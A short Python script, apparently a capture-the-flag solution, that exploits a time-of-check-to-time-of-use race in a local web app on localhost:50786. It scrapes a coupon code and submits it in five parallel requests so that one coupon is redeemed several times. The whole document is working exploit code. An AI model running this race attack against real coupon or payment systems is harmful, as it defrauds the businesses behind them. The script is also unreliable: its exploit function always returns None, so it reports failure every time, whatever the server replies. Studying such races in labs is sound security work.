import requests
import concurrent.futures

def get_coupon(session):
    response = session.get('http://localhost:50786')
    return response.text.split('<strong>')[1].split('</strong>')[0]

def exploit_toctou(session, coupon):
    def make_request():
        return session.post('http://localhost:50786/process', data={'coupon': coupon})

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(make_request) for _ in range(5)]
        responses = [future.result() for future in concurrent.futures.as_completed(futures)]

    for response in responses:
        print(response.text)

    return None

def main():
    session = requests.Session()
    coupon = get_coupon(session)
    print(f"Got coupon: {coupon}")

    flag = exploit_toctou(session, coupon)
    if flag:
        print(f"Successfully exploited TOCTOU! Flag: {flag}")
    else:
        print("Failed to exploit TOCTOU vulnerability.")

if __name__ == '__main__':
    main()